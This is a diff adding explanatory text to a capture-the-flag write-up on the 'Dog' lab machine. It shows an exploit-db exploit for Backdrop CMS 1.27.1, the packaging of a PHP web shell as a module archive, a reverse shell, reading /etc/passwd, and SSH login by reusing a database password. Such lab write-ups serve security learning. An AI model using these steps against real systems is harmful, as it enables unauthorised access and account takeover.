@@ -265,6 +265,10 @@ If we use this username and password, we can gain access to this account, which 
 
 https://www.exploit-db.com/exploits/52021
 
+
+The issue with **Backdrop CMS version 1.27.1** is that it has bad validation of files inside module archive uploads and does not implement sandboxing mechanisms. This allows attackers to inject malicious code, which can then be executed when accessing the file at `http://dog.htb/modules/shell/shell.php`
+
+
 ```
 (myenv) Hexada@hexada ~/app/vrm/dog$ python3 52021.py http://10.10.11.58                                         
 Backdrop CMS 1.27.1 - Remote Command Execution Exploit
@@ -274,6 +278,8 @@ Go to http://10.10.11.58/admin/modules/install and upload the shell.zip for Manu
 Your shell address: http://10.10.11.58/modules/shell/shell.php
 (myenv) Hexada@hexada ~/app/vrm/dog$
 ```
+
+Edit the 'shell/shell.php' file and insert your malicious code. For example
 
 ```
 shell/shell.php
@@ -297,6 +303,8 @@ if (isset($_GET['cmd'])) {
 </html>
 ```
 
+Next, archive the files into a `.tar` file:
+
 ```
 Hexada@hexada ~/app/vrm/dog$ tar -cvf shell.tar shell/                                                           
 shell/
@@ -304,12 +312,19 @@ shell/shell.info
 shell/shell.php
 ```
 
+Once the archive is created, inject your malicious code into the `shell.php` file
+
 ![image](https://github.com/user-attachments/assets/91421d76-7e2e-4b3f-9b09-e5ebae8cce83)
+
+for convenience, I connect via reverse shell
 
 ![image](https://github.com/user-attachments/assets/4b886c3e-0a72-4798-96cc-2bf08be9aaa5)
 
+it would be helpful to see account information
+
 ```
 www-data@dog:/home/johncusack$ cat /etc/passwd
+
 cat /etc/passwd
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
@@ -358,12 +373,18 @@ jobert
 johncusack
 ```
 
+Both jobert and johncusack have home directories under /home, confirming that they are interactive users. Since we previously found a SQL database password in settings.php, it’s worth trying this password to connect to these accounts via SSH
+
+From the list of users, i think we should try connecting via SSH using the SQL password retrieved from settings.php
+
 ```
 Hexada@hexada ~/app/vrm/dog$ ssh jobert@dog.htb                                                                  
 jobert@dog.htb's password: 
 Permission denied, please try again.
 jobert@dog.htb's password: 
 ```
+
+Now, let's try to connect via johncusack
 
 ```
 Hexada@hexada ~/app/vrm/dog$ ssh johncusack@10.10.11.58                                                   130 ↵  
@@ -400,6 +421,8 @@ To check for new updates run: sudo apt update
 johncusack@dog:~$ cat user.txt
 255e46faea7f39241427******
 ```
+
+Nice, we did it
 
 ```
 johncusack@dog:~$ sudo -l
